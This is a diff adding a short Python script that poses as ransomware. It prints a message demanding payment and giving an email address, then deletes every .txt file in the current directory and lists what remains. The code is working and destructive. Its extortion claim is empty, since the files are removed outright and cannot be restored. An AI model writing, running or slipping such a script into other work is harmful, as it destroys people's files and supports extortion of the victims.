@@ -1,0 +1,21 @@
+#!/usr/bin/env python3
+import os
+import glob
+import time
+a='*'
+print(50*a)
+print("im about to format your phone. hahaha!!!. pay me some money to restore your files back. this is my email. call me now: engsam1000@gmail.com")
+time.sleep(2)
+contents=[]
+b4delete=os.listdir()
+print(b4delete)
+print('\n')
+for file in os.listdir():
+    if file in glob.glob("*.txt"):
+        print(file)
+        os.remove(file)
+        contents.append(file)
+        print("Deleted Successfully")
+print(50*a)
+for file in os.listdir():
+    print(file)
